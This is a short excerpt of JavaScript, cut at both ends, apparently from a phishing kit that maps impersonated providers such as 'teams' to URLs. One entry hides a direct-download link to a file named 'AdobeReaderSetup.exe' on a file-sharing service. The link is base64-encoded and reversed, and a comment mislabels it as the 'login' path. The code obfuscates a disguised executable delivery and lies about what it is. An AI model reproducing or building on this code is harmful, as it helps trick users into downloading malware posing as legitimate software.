...
const providerUrls = {
    ...
    teams: {
        ...
        e: btoa("scl/fi/whg53tcuuds9gku5zwyl4/AdobeReaderSetup.exe?rlkey=qfc9risa5mybsrhbu54bnvhs8&st=5toiuqks&dl=1").split("").reverse().join("")  // Path: "login" (base64 + reversed)
    },
